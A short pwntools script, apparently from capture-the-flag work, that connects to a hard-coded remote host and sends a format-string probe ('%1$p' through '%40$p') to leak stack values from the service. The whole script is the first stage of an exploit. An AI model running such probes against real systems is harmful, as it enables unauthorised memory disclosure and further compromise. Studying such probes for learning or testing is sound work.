from pwn import *
context.arch='amd64'
#context.log_level='debug'
HOST,PORT='52.76.96.108',9008
def conn():
    return remote(HOST,PORT)

r=conn()
r.recvuntil(b"> ",timeout=5)
# probe positional args 1..40
payload = b"log "
for i in range(1,41):
    payload += b"%%%d$p."%i
payload = payload.strip(b".")
print("sending len",len(payload))
r.sendline(payload)
data=r.recvuntil(b"> ",timeout=5)
print("OUT:",data)
r.close()
